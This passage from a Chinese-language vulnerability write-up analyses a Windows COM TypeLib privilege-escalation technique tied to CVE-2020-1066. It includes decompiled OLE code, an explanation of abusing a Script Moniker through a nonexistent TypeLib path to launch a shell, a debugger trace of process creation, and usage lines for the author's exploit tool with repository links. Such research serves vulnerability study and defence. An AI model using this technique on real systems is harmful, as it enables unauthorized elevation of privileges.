  phkResult = (HKEY)-1;
  v22 = (HKEY)-1;
  v21 = (HKEY)-1;
  pptlib = 0;
  //先找Interface
  wcscpy_s(&Dst, 0x47u, L"Interface\\");
  StringFromGUID2(rguid, &sz, 39);
  //如果存在Forward
  wcscat_s(&Dst, 0x47u, L"\\Forward");
  cbData = 520;
  if ( QueryClassesRootValueW(&Dst, &Data, &cbData)
    || CLSIDFromString(&Data, &pclsid)
    || GetTypeInfoOfIIDFwd(&pclsid, a2, a3 + 1) )
  {
    *(_DWORD *)SubVersion = 0;
    *(_DWORD *)Version = 0;
    //找里面的TypeLib
    wcscpy_s(&Dst, 0x47u, L"TypeLib\\");
    result = SzLibIdOfIID(rguid, &tempData, 40, Version, SubVersion, &foundDotted);
    if ( (signed int)result >= 0 )
    {
    //打开ClassesRoot根节点
      if ( OpenClassesRootKeyW(&Dst, &hKey) )
      {
        result = (wchar_t *)-2147319779;
      }
      else
      {
        SubKey = 0;
        //查找子健,枚举版本号
        for ( dwIndex = 0; !RegEnumKeyW(hKey, dwIndex, &Name, 0xDu); ++dwIndex )
        {
          versionLookUp = _wcstoul(&Name, &EndPtr, 16);
          if ( *EndPtr == '.' )
          {
            if ( (versionLookUpNext = _wcstoul(EndPtr + 1, 0, 16), !foundDotted) && versionLookUp > Version[0]
              || versionLookUp == Version[0] && versionLookUpNext >= SubVersion[0] )
            {
              *(_DWORD *)SubVersion = versionLookUpNext;
              *(_DWORD *)Version = versionLookUp;
              wcscpy_s(&SubKey, 0xDu, &Name);
            }
          }
        }
        if ( !RegOpenKeyW(hKey, &SubKey, &phkResult) )
        {
          if ( phkResult == hKey )
            hKey = (HKEY)-1;
          v6 = 0;
          //继续枚举子健
          for ( i = RegEnumKeyW(phkResult, 0, &Dst, 0x10u); !i; i = RegEnumKeyW(phkResult, v6, &Dst, 0x10u) )
          {
            if ( FIsLCID(&Dst) )
            {
              if ( RegOpenKeyW(phkResult, &Dst, &v22)
                || RegOpenKeyW(v22, L"win32", &v21) && (RegEnumKeyW(v22, 0, &Dst, 6u) || RegOpenKeyW(v22, &Dst, &v21)) )
              {
                break;
              }
              cbData = 520;
              if ( RegQueryValueW(v21, 0, &Data, &cbData) )
                break;
                //找到后就加载
              v8 = LoadTypeLib(&Data, &pptlib);
              v9 = (wchar_t *)v8;
              if ( !v8 || v8 >= 0 )
              {
                //根据GUID查找TypeInfo
                v10 = pptlib->lpVtbl->GetTypeInfoOfGuid(pptlib, v12, &v14);
                v9 = (wchar_t *)v10;
                if ( !v10 || v10 >= 0 )
                {
                  *v13 = v14;
                  v9 = 0;
                }
              }
              goto LABEL_26;
            }
            ++v6;
          }
        }
....       

```
每个TypeLib可以是嵌套的TypeLib结构,而加载嵌套的TypeLib也会递归调用LoadTypeLibEx,具体构造方法参考利用工具代码和[微软官方API](https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-itypelib2).这样就可以在递归加载TypeLib时指定一个不存在的TypeLib文件路径,就可以被当作一个[Moniker](https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imoniker)来解析,通过Moniker的DisplayName.这里用的是Script Monike,即script:xxx.sct脚本文件,最终Script Moniker被解析触发BindToObject,以Unmarshal反序列化调用者权限启动Shell,原理如下:
```
HRESULT __stdcall LoadTypeLibEx(LPCOLESTR szFile, REGKIND regkind, ITypeLib **pptlib)
{
  
...
      ptlib = OLE_TYPEMGR::LookupTypeLib(g_poletmgr, szFile, syskind);
      if ( ptlib )
        goto LABEL_31;
    //Typelib文件路径不存在时
    if ( FindTypeLib(szFileNameRef, (LONG)&szFullPath, v5) )
    {
      if ( CreateBindCtx(1u, &ppbc) )
        goto LABEL_67;
      v8 = SysAllocString(szFileNameRef);
      if ( v8 )
      {
        //可以解析成解析Script Moniker
        stat = MkParseDisplayName(ppbc, v8, &pchEaten, &ppmk);
        SysFreeString(v8);
        if ( !stat )
        {
          //启动shell
          stat = ppmk->lpVtbl->BindToObject(ppmk, ppbc, 0, &IID_ITypeLib, (void **)&ptlib);
          ppmk->lpVtbl->Release(ppmk);
        }
      }
...    
```
![查看大图](https://ftp.bmp.ovh/imgs/2020/05/3f68b0bcbe398136.png)
对比Process Monitor,以下是Script Moniker最终创建进程的调试结果
```
Breakpoint 0 hit
kernel32!CreateProcessW:
0033:00000000`77741bb0 4883ec68        sub     rsp,68h
//启动的就是exp
0: kd> dc @rdx
00000000`0378b9f8  00430022 002f003a 006c0064 0074002f  ".C.:./.d.l./.t.
00000000`0378ba08  00730065 002f0074 006b006f 004d002f  e.s.t./.o.k./.M.
00000000`0378ba18  00430079 006d006f 006f0045 002e0070  y.C.o.m.E.o.p...
00000000`0378ba28  00780065 00220065 00310020 00000000  e.x.e.". .1.....
00000000`0378ba38  00000000 00000000 00000000 00000000  ................
00000000`0378ba48  00000000 00000000 00000000 00000000  ................
0: kd> kv
 # Child-SP          RetAddr           : Args to Child                                                           : Call Site
00 00000000`0288c3e8 000007fe`ec9ec0dd : 00000000`00000000 000007fe`ec8e1982 00001e9f`9ac2b3f6 00000000`00000000 : kernel32!CreateProcessW
01 00000000`0288c3f0 000007fe`ec9ec55f : 00000000`00000000 00000000`0288c5c0 00000000`0288c788 00000000`0288c5c0 : wshom!CWshShell::CreateShortcut+0x30d
02 00000000`0288c4e0 000007fe`feb616d0 : 00000000`0288c7a0 00000000`002fd46c 00000000`0378b9f8 00000000`00000000 : wshom!CWshShell::Exec+0x2b3
03 00000000`0288c5a0 000007fe`feb624d2 : 00000000`00000104 000007fe`fec008e0 00000000`00000fff 000007fe`feb623b8 : OLEAUT32!DispCallFuncAmd64+0x60
04 00000000`0288c600 000007fe`feb61de1 : 00000000`0366c2b8 00000000`037cd3f8 00000000`037806c0 00000000`0288c768 : OLEAUT32!DispCallFunc+0x268
05 00000000`0288c6b0 000007fe`ec9e12d5 : 00000000`002f60d0 000007fe`feb6150c 00000000`03796ee0 00000000`00000002 : OLEAUT32!CTypeInfo2::Invoke+0x39a
06 00000000`0288ca20 000007fe`ec9e121d : 00000000`00000bc4 000007fe`ebf5d79e 00000000`00000000 000007fe`ff8724c8 : wshom!CDispatch::Invoke+0xad
07 00000000`0288ca80 000007fe`ebf7ad24 : 00000000`00001f80 00000000`00000bc4 00000000`0288e560 00000000`002ffbc0 : wshom!CWshExec::Invoke+0x4d
08 00000000`0288cae0 000007fe`ebf79dc7 : 00000000`00000000 00000000`002ffbc0 00000000`00000000 00000000`001758b0 : jscript!CScriptRuntime::Run+0x2e1d
09 00000000`0288e4f0 000007fe`ebf79c09 : 00000000`00000000 00000000`0017c6b0 00000000`00000000 00000000`00000000 : jscript!ScrFncObj::CallWithFrameOnStack+0x187
0a 00000000`0288e700 000007fe`ebf79a25 : 00000000`001758b0 00000000`00000000 00000000`001758b0 00000000`00000000 : jscript!ScrFncObj::Call+0xb5
0b 00000000`0288e7a0 000007fe`ebf7903b : 00000000`0008001f 00000000`001758b0 00000000`00000000 00000000`002f6660 : jscript!CSession::Execute+0x1a5
0c 00000000`0288e890 000007fe`ebf79386 : 00000000`00000000 00000000`001758b0 00000000`00000000 ffffffff`ffffffff : jscript!COleScript::ExecutePendingScripts+0x223
0d 00000000`0288e960 000007fe`eca17186 : 00000000`00000000 000007fe`eca17f9d 00000000`002fc410 01d61e99`4640f6a8 : jscript!COleScript::SetScriptState+0x6e
0e 00000000`0288e990 000007fe`eca17004 : 00000000`002fc400 00000000`002fc400 00000000`002f3ce0 00000000`002f3ce0 : scrobj!ComScriptlet::Inner::StartEngines+0xcf
0f 00000000`0288e9f0 000007fe`eca16dc1 : 00000000`002c95e0 00000000`002fc400 00000000`002f3ce0 000007fe`ff687a01 : scrobj!ComScriptlet::Inner::Init+0x27a
10 00000000`0288ea90 000007fe`eca16caa : 00000000`002f3ce0 00000000`00000000 00000000`00000000 00000000`00000000 : scrobj!ComScriptlet::New+0xca
11 00000000`0288eac0 000007fe`eca220f3 : 00000000`002f62a0 00000000`00249618 00000000`002ce680 00000000`037143d8 : scrobj!ComScriptletConstructor::Create+0x68
12 00000000`0288eb10 000007fe`ff6678d6 : 00000000`03798760 00000000`03718760 00000000`037da9c0 000007fe`fee9b065 : scrobj!ComScriptletMoniker::BindToObject+0x7f
13 00000000`0288eb60 000007fe`ff5669ba : 000007fe`ff68be00 000007fe`ff6608bd 00000000`00000030 000007fe`ff68be30 : ole32!IMoniker_BindToObject_Stub+0x16 [d:\w7rtm\com\ole32\oleprx32\proxy\call_as.c @ 2264] 
14 00000000`0288eba0 000007fe`fee9bc86 : 00000000`00000005 00000000`03718760 000007fe`ff687a18 00000000`037da9c0 : ole32!IMoniker_RemoteBindToObject_Thunk+0x2a [o:\w7rtm.obj.amd64fre\com\ole32\oleprx32\proxy\daytona\objfre\amd64\mega_p.c @ 487] 
15 00000000`0288ebe0 000007fe`fedf48d6 : 00000000`0288f248 000007fe`ff66376f 00000000`03715700 00000000`0379a2a0 : RPCRT4!Ndr64AsyncServerCallAll+0x1806
16 00000000`0288f1a0 000007fe`ff660883 : 00000000`00000000 00000000`00000000 000007fe`ff695b80 00000000`03715ea0 : RPCRT4!NdrStubCall3+0xc6
17 00000000`0288f200 000007fe`ff660ccd : 00000000`00000001 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CStdStubBuffer_Invoke+0x5b [d:\w7rtm\com\rpc\ndrole\stub.cxx @ 1586] 
18 00000000`0288f230 000007fe`ff660c43 : 00000000`037da9c0 00000000`0579cb14 00000000`036ce730 000007fe`eca36a40 : ole32!SyncStubInvoke+0x5d [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1187] 
19 00000000`0288f2a0 000007fe`ff51a4f0 : 00000000`037da9c0 00000000`0361e890 00000000`037da9c0 00000000`00000178 : ole32!StubInvoke+0xdb [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1396] 
1a 00000000`0288f350 000007fe`ff52d551 : 00000000`00000000 00000000`00000001 00000000`0376e9e0 00000000`03715ea0 : ole32!CCtxComChnl::ContextInvoke+0x190 [d:\w7rtm\com\ole32\com\dcomrem\ctxchnl.cxx @ 1262] 
1b 00000000`0288f4e0 000007fe`ff66347e : 00000000`0361e890 00000000`00000000 00000000`03718760 00000000`00000000 : ole32!STAInvoke+0x91 [d:\w7rtm\com\ole32\com\dcomrem\callctrl.cxx @ 1923] 
1c 00000000`0288f530 000007fe`ff66122b : 00000000`d0908070 00000000`0361e890 00000000`01d93e30 00000000`03718760 : ole32!AppInvoke+0x1aa [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1081] 
1d 00000000`0288f5a0 000007fe`ff663542 : 00000000`037da930 00000000`00000400 00000000`00000000 00000000`01d98a30 : ole32!ComInvokeWithLockAndIPID+0x52b [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1727] 
1e 00000000`0288f730 000007fe`ff52d42d : 00000000`03715ea0 00000000`00000000 00000000`0378f190 00000000`037da930 : ole32!ComInvoke+0xae [d:\w7rtm\com\ole32\com\dcomrem\channelb.cxx @ 1469] 
1f 00000000`0288f760 000007fe`ff52d1d6 : 00000000`0361e890 00000000`037da938 00000000`00000400 00000000`00000000 : ole32!ThreadDispatch+0x29 [d:\w7rtm\com\ole32\com\dcomrem\chancont.cxx @ 298] 
20 00000000`0288f790 00000000`77639bd1 : 00000000`00000000 00000000`00000000 00000000`00000000 b2698378`e8b9daaa : ole32!ThreadWndProc+0xaa [d:\w7rtm\com\ole32\com\dcomrem\chancont.cxx @ 654] 
21 00000000`0288f810 00000000`776398da : 00000000`0288f970 000007fe`ff52d12c 000007fe`ff6c5780 00000000`006c4200 : USER32!UserCallWinProcCheckWow+0x1ad
22 00000000`0288f8d0 000007fe`ff52d0ab : 00000000`000b0098 00000000`000b0098 000007fe`ff52d12c 00000000`00000000 : USER32!DispatchMessageWorker+0x3b5
23 00000000`0288f950 000007fe`ff653e57 : 00000000`0361e890 00000000`00000000 00000000`0361e890 000007fe`ff513032 : ole32!CDllHost::STAWorkerLoop+0x68 [d:\w7rtm\com\ole32\com\objact\dllhost.cxx @ 957] 
24 00000000`0288f9b0 000007fe`ff500106 : 00000000`0361e890 00000000`036d6510 00000000`00000000 00000000`00000000 : ole32!CDllHost::WorkerThread+0xd7 [d:\w7rtm\com\ole32\com\objact\dllhost.cxx @ 834] 
25 00000000`0288f9f0 000007fe`ff500182 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CRpcThread::WorkerLoop+0x1e [d:\w7rtm\com\ole32\com\dcomrem\threads.cxx @ 257] 
26 00000000`0288fa30 00000000`7773652d : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ole32!CRpcThreadCache::RpcWorkerThreadEntry+0x1a [d:\w7rtm\com\ole32\com\dcomrem\threads.cxx @ 63] 
27 00000000`0288fa60 00000000`7786c521 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0xd
28 00000000`0288fa90 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
```
我的漏洞利用工具测试方式如下,需要管理员运行
```
1.只适用Windows7系统直接运行,无参数,替换默认Typelib

MyComEop.exe

2.替换指定接口TypeLIb文件路径的Com组件TypeLIb,比如C:\xxx.dll

MyComEop.exe [u] [TypeLib_Path]

3.替换指定接口IID的Com组件TypeLIb,比如 {55e3ea25-55cb-4650-8887-18e8d30bb4bc}

MyComEop.exe [u] [IID_Interface]

4.高级模式接口IID=[IID_Interface],接口名称=[InterfaceName],接口的TypeLib_GUID=[TypeLib_GUID_Interface],接口TypeLIb文件路径=[TypeLib_Path]

MyComEop.exe [u] [IID_Interface] [InterfaceName] [TypeLib_GUID_Interface] [TypeLib_Path] [Disable_Redirection]

5.不替换文件,仅测试指定接口IID的Com组件TypeLIb利用,比如 {55e3ea25-55cb-4650-8887-18e8d30bb4bc}

MyComEop.exe [t] [IID_Interface]

```
#### 运行效果 ####

以下是笔者exp运行的效果,如图:
![点击看大图](https://ftp.bmp.ovh/imgs/2020/04/0675ebb200afb3a5.gif)

#### 相关项目 ####
[CVE-2020-0787-EXP](https://gitee.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION)

[Windows CardSpace服务反编译工程](https://gitee.com/cbwang505/Windows_CardSpace_Service)

[我的ole32逆向工程](https://gitee.com/cbwang505/MyOle32ReverseEngineering)

[我的漏洞利用工具](https://gitee.com/cbwang505/TypeLibUnmarshaler)

[符号链接工具](https://github.com/googleprojectzero/symboliclink-testing-tools)

[CVE-2020-1066-EXP](https://gitee.com/cbwang505/CVE-2020-1066-EXP)

#### 相关引用 ####

[CVE-2020-1066](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-1066)

#### 参与贡献 ####

作者来自ZheJiang Guoli Security Technology,邮箱cbwang505@hotmail.com